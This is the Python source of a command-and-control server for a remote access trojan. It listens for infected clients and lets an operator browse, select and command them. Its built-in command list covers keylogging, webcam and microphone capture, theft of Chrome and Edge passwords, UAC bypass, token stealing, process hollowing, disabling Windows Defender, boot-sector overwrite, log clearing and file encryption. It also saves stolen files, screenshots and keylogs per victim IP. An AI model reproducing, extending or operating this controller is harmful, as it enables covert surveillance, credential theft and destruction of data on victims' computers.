# coding=utf-8
import json
import ntpath
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time

commands = {'help': ['Show this help'],
            'list': ['List connected clients'],
            'select': ['Select a client by its index'],
            'quit': ['Background current connection'],
            'kill': ['Kill current connection'],
            'cls': ['Clear screen'],
            'lcd': ['Change local working directory'],
            'lls': ['List local files'],
            'upload': ['Upload a file to client'],
            'download': ['Download a file from client'],
            'screenshot': ['Grab a screenshot'],
            'webcam': ['Take a snapshot from webcam'],
            'record': ['Record an audio from microphone'],
            'keylogger': ['Capture keystrokes'],
            'ps': ['List running process'],
            'pkill': ['Terminate a running process'],
            'run': ['Create a process without waiting for termination'],
            'hiderun': ['Create a process in hidden mode'],
            'pyexec': ['Execute Python code from string'],
            'persistence': ['Apply persistence mechanism'],
            'bypassuac': ['Elevate as administrator without UAC prompt'],
            'stealtoken': ['Duplicate access token from a running process'],
            'browser': ['Extract data from web browser'],
            'getinfo': ['Get system information'],
            'idletime': ['Display how much time the user is inactive'],
            'drives': ['List drives'],
            'startup': ['List startup items'],
            'software': ['List installed software'],
            'ifeo': ['Image file execution options injection'],
            'runpe': ['Process hollowing'],
            'poweroff': ['Perform emergency shutdown'],
            'setcritical': ['Set as critical process'],
            'msgbox': ['Pop up a custom message box'],
            'askuac': ['Ask for UAC elevation'],
            'askpass': ['Pop up a password prompt'],
            'zip': ['Create a zip archive'],
            'unzip': ['Extract files from a zip archive'],
            'openwin': ['Get list of open windows'],
            'activewin': ['Get last active window'],
            'getclip': ['Get clipboard text'],
            'setclip': ['Copy text to clipboard'],
            'filewatch': ['Monitor a directory tree for changes'],
            'procmon': ['Monitor specific process creation'],
            'encrypt': ['Encrypt files'],
            'decrypt': ['Decrypt files'],
            'webul': ['Upload a file to a URL'],
            'webdl': ['Download a file from a URL'],
            'freeze': ['Block keyboard and mouse input'],
            'openurl': ['Open a url in web browser'],
            'wallpaper': ['Change desktop background'],
            'hideme': ['Set hidden and system attributes'],
            'killwd': ['Disable Windows Defender'],
            'killmbr': ['Overwrite boot sector'],
            'clearlog': ['Clear event logs'],
            'cleanup': ['Remove persistence and self delete']
            }


class Server:

    def __init__(self):
        self.host = ''
        self.port = 9999
        self.socket = None
        self.connections = []
        self.addresses = []
        self.save_dir = os.getcwd()

    def load_config(self):
        try:
            if os.path.isfile('config/conf'):
                f = open('config/conf', 'r')
                conf = json.load(f)
                self.port = conf['port']
                if os.path.isdir(conf['save_dir']):
                    self.save_dir = conf['save_dir']
                f.close()
        except Exception as exception:
            print('[-] Load configuration error: ' + str(exception))

    def listen(self):
        try:
            self.socket = socket.socket()
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            print('[+] Listening on port {}'.format(self.port))
        except socket.error as e:
            print(e)
            sys.exit(1)

    def accept(self):
        while True:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                self.connections.append(conn)
                self.addresses.append(address)
                print('[+] Connection has been established: ' + address[0])
            except Exception as e:
                print('[-] Error accepting connections: ' + str(e))
                time.sleep(5)

    def interact(self):
        while True:
            try:
                cmd = input('flc> ')
                if not cmd:
                    continue
                elif cmd == 'help':
                    Helper.print_help()
                elif cmd in ['quit', 'exit']:
                    self.socket.close()
                    sys.exit(0)
                elif cmd in ['cls', 'clear']:
                    subprocess.call('cls', shell=True)
                elif cmd == 'list':
                    self.list_connections()
                elif 'select' in cmd:
                    conn, target = self.get_target(cmd)
                    if conn is not None:
                        self.send_commands(conn, target)
                elif cmd[:2] == 'cd':
                    Helper.lcd(cmd[3:])
                elif cmd == 'ls':
                    Helper.lls()
                elif cmd.split(' ')[0] == 'alias':
                    Alias.alias(' '.join(cmd.strip().split()))
                elif cmd.split(' ')[0] == 'unalias':
                    Alias.unalias(cmd.strip().split())
                else:
                    print('[-] Command not recognized')
            except KeyboardInterrupt:
                self.socket.close()
                sys.exit(0)
            except Exception as e:
                Helper.print_error('[-] Error: ' + str(e))

    def list_connections(self):
        results = ''
        for i, conn in reversed(list(enumerate(self.connections))):
            try:
                Helper.send(conn, 'null')
                Helper.recv(conn)
            except:
                del self.connections[i]
                del self.addresses[i]
                continue
        for i, conn in enumerate(self.connections):
            results += str(i) + '   ' + str(self.addresses[i][0]) + '   ' + str(self.addresses[i][1]) + '\n'
        print('----- Clients -----' + '\n' + results)

    def get_target(self, cmd):
        try:
            target = cmd.replace('select', '')
            target = int(target)
            conn = self.connections[target]
            try:
                Helper.send(conn, 'null')
                Helper.recv(conn)
            except:
                del self.connections[target]
                del self.addresses[target]
                print('[-] Connection is unavailable')
                return None, None
            print('[+] Connected to ' + str(self.addresses[target][0]))
            return conn, target
        except:
            print('[-] Not a valid selection')
            return None, None

    def send_commands(self, conn, target):
        while True:
            try:
                command = Command()
                cmd = input(Helper.recv_text(conn))
                cmd_name = cmd.split(' ')[0]
                if not cmd:
                    Helper.send(conn, 'null')
                elif cmd_name in Alias.aliases:
                    Alias.send_aliases(conn, ' '.join(cmd.strip().split()))
                elif cmd in ['quit', 'exit']:
                    Helper.send(conn, 'null')
                    break
                elif cmd in ['cls', 'clear']:
                    subprocess.call('cls', shell=True)
                    Helper.send(conn, 'null')
                elif cmd in ['kill', 'poweroff', 'bsod']:
                    Helper.send(conn, cmd)
                    break
                elif cmd in Helper.cmds.keys():
                    print('----- {} -----'.format(cmd))
                    Helper.select(conn, Helper.cmds.get(cmd))
                elif cmd in ['killmbr']:
                    Helper.show_warn(conn, cmd)
                elif hasattr(command, cmd_name):
                    func = getattr(command, cmd_name)
                    func(conn, cmd)
                else:
                    Helper.send(conn, cmd)
                    print(Helper.recv_text(conn))
            except ConnectionResetError as e:
                print('[-] Connection was lost: ' + str(e))
                del self.connections[target]
                del self.addresses[target]
                break
            except KeyboardInterrupt:
                Helper.send(conn, 'null')
                break
            except Exception as exception:
                Helper.send(conn, 'null')
                Helper.print_error('[-] Error: ' + str(exception))
                continue


class Command:

    @staticmethod
    def lcd(conn, cmd):
        Helper.lcd(Helper.get_args(cmd))
        Helper.send(conn, 'null')

    @staticmethod
    def lls(conn, _):
        Helper.lls()
        Helper.send(conn, 'null')

    @staticmethod
    def upload(conn, cmd):
        filename = Helper.get_args(cmd)
        try:
            if os.path.isfile(filename):
                Helper.send(conn, 'upload ' + os.path.basename(filename))
                Helper.send_file(conn, filename)
                print(Helper.recv_text(conn))
            else:
                print('[-] File not found')
                Helper.send(conn, 'null')
        except Exception as e:
            Helper.print_error('[-] Error: ' + str(e))

    @staticmethod
    def download(conn, cmd):
        filename = Helper.get_args(cmd)
        Helper.send(conn, cmd)
        Helper.recv_file(conn, Helper.get_client_dir(conn, ntpath.basename(filename)))

    @staticmethod
    def screenshot(conn, cmd):
        Helper.send(conn, cmd)
        Helper.recv_file(conn, Helper.get_client_dir(conn, 'Screenshot{}.png'.format(Helper.get_time())))

    @staticmethod
    def webcam(conn, cmd):
        Helper.send(conn, cmd)
        Helper.recv_file(conn, Helper.get_client_dir(conn, 'Webcam{}.png'.format(Helper.get_time())))

    @staticmethod
    def record(conn, cmd):
        Helper.send(conn, cmd)
        Helper.recv_file(conn, Helper.get_client_dir(conn, 'Microphone{}.png'.format(Helper.get_time())))

    @staticmethod
    def keylogger_save(conn, cmd):
        Helper.send(conn, cmd)
        Helper.recv_file(conn, Helper.get_client_dir(conn, 'Keylog{}.txt'.format(Helper.get_time())))

    @staticmethod
    def filewatch(conn, cmd):
        Helper.send(conn, cmd)
        event = threading.Event()

        def recv():
            while True:
                status, data = Helper.recv(conn)
                if status == -1:
                    event.set()
                    break
                print(data.decode())

        threading.Thread(target=recv, daemon=True).start()
        while True:
            cmd = input('filewatch> ')
            if cmd in ['q', 'quit', 'ex', 'exit']:
                Helper.send(conn, 'stop')
                event.wait()
                break

    @staticmethod
    def cleanup(conn, cmd):
        Helper.send(conn, cmd)
        status, data = Helper.recv(conn)
        print(data.decode())
        if status:
            raise ConnectionResetError('Cleanup success')


class Alias:
    aliases = {}

    @staticmethod
    def alias(cmd):
        args = cmd.split(' ')
        if len(args) == 1:
            print('----- Aliases -----')
            for k, v in Alias.aliases.items():
                print('{0:15}{1}'.format(k, v))
            print()
            return
        equal_mark = cmd.find('=')
        if equal_mark == -1:
            print('Usage: <alias_name>=<command>')
            return
        alias_name = cmd[6:equal_mark].strip()
        command = cmd[equal_mark + 1:].strip()
        if len(alias_name) == 0 or len(command) == 0:
            print('Usage: <alias_name>=<command>')
            return
        Alias.aliases[alias_name] = command
        Alias.save_aliases()
        print('[+] Alias created: {}'.format(alias_name))

    @staticmethod
    def unalias(cmd):
        if len(cmd) == 1:
            print('Usage: unalias <alias_name>')
            return
        alias = cmd[1]
        if alias not in Alias.aliases:
            print('[-] Alias does not exist: {}'.format(alias))
            return
        del Alias.aliases[alias]
        Alias.save_aliases()
        print('[+] Alias removed: {}'.format(alias))

    @staticmethod
    def load_aliases():
        try:
            if os.path.isfile('config/alias'):
                f = open('config/alias', 'r')
                Alias.aliases = json.load(f)
                f.close()
        except Exception as exception:
            print('[-] Load aliases error: ' + str(exception))

    @staticmethod
    def save_aliases():
        try:
            alias_json = json.dumps(Alias.aliases)
            f = open('config/alias', 'w')
            f.write(alias_json)
            f.close()
        except Exception as exception:
            print('[-] Save aliases error: ' + str(exception))

    @staticmethod
    def send_aliases(conn, cmd):
        command = cmd.split()[0]
        args = cmd[len(command) + 1:].split(' ')
        args = [x for x in args if x]
        prototype = Alias.aliases[command]
        if len(re.findall(r'<.*?>', prototype)) == 0:
            if len(cmd.split(' ')) > 1:
                print('[-] Command takes no argument')
                Helper.send(conn, 'null')
                return
        else:
            if len(args) is len(re.findall(r'<.*?>', prototype)):
                regex = r'<.*?>'
                for arg in args:
                    prototype = re.sub(regex, arg, prototype, count=1)
            else:
                print('[-] Number of arguments does not match')
                Helper.send(conn, 'null')
                return
        print('[+] Sending command: ' + prototype)
        Helper.send(conn, prototype)
        print(Helper.recv_text(conn))


class Helper:
    cmds = {
        'persistence': ['persistence_startup', 'persistence_registry', 'persistence_schtasks', 'persistence_service'],
        'bypassuac': ['bypassuac_fodhelper', 'bypassuac_clr'],
        'keylogger': ['keylogger_start', 'keylogger_stop', 'keylogger_save'],
        'stealtoken': ['stealtoken_system', 'stealtoken_ti', 'stealtoken_admin', 'run_as_user', 'rus_as_admin'],
        'browser': ['get_passwords chrome', 'get_passwords edge', 'get_bookmarks chrome', 'get_bookmarks edge',
                    'get_history chrome', 'get_history edge'],
        'killwd': ['killwd_sandbox', 'killwd_registry', 'killwd_service']
    }

    @staticmethod
    def print_help():
        print('----- Commands -----')
        for k, v in commands.items():
            print('{0:15}{1}'.format(k, v[0]))
        print()

    @staticmethod
    def print_error(msg):
        os.system('')
        print('\033[0;31m' + msg + '\033[0m')

    @staticmethod
    def lcd(path):
        if os.path.exists(path):
            os.chdir(path)
        print(os.getcwd())
        print()

    @staticmethod
    def lls():
        root, dirs, files = next(os.walk(os.getcwd()))
        for dir_name in dirs:
            print(dir_name + '/')
        for filename in files:
            print(filename)
        print()

    @staticmethod
    def select(conn, cmds):
        try:
            for i, cmd in enumerate(cmds):
                print(str(i) + '. ' + cmd)
            print()
            index = input('Please select: ')
            try:
                cmd = cmds[int(index)]
            except (IndexError, ValueError):
                print('[-] Invalid selection')
                Helper.send(conn, 'null')
                return
            Helper.send(conn, cmd)
            print(Helper.recv_text(conn))
        except KeyboardInterrupt:
            Helper.send(conn, 'null')

    @staticmethod
    def show_warn(conn, cmd):
        try:
            if '-y' in cmd:
                Helper.send(conn, cmd)
                return
            confirm = input('This operation cannot be undone, are you sure? ')
            if confirm.lower() == 'y':
                Helper.send(conn, cmd)
                print(Helper.recv_text(conn))
            else:
                print('[-] Aborted')
                Helper.send(conn, 'null')
        except KeyboardInterrupt:
            print('\n[-] Aborted')
            Helper.send(conn, 'null')

    @staticmethod
    def get_args(cmd):
        cmd_name = cmd.split(' ')[0]
        cmd_arg = cmd[len(cmd_name) + 1:].strip()
        return cmd_arg

    @staticmethod
    def get_time():
        return str(time.strftime('_%Y%m%d%H%M%S', time.localtime()))

    @staticmethod
    def send(conn, data):
        data = data.encode()
        conn.send(struct.pack('i', len(data)) + data)

    @staticmethod
    def send_file(conn, file):
        size = struct.pack('i', os.stat(file).st_size)
        conn.send(size)
        with open(file, 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                conn.send(data)

    @staticmethod
    def recv(conn):
        head = conn.recv(8)
        status = struct.unpack('i', head[:4])[0]
        size = struct.unpack('i', head[4:8])[0]
        data = b''
        while size:
            buf = conn.recv(size)
            size -= len(buf)
            data += buf
        return status, data

    @staticmethod
    def recv_text(conn):
        _, data = Helper.recv(conn)
        data = data.decode()
        if data == 'null':
            data = ''
        return data

    @staticmethod
    def recv_file(conn, file):
        try:
            status, data = Helper.recv(conn)
            if status == 0:
                print(data.decode())
            else:
                with open(file, 'wb') as f:
                    f.write(data)
                print('[+] File downloaded successfully')
        except Exception as e:
            Helper.print_error('[-] Error: ' + str(e))

    @staticmethod
    def get_client_dir(conn, filename):
        address = server.addresses[server.connections.index(conn)]
        client_directory = os.path.join(server.save_dir, '{}'.format(address[0]))
        if not os.path.isdir(client_directory):
            os.mkdir(client_directory)
        save_path = os.path.join(client_directory, filename)
        print(save_path)
        return save_path


server = Server()
server.load_config()
server.listen()
threading.Thread(target=server.accept, daemon=True).start()
Alias.load_aliases()
server.interact()
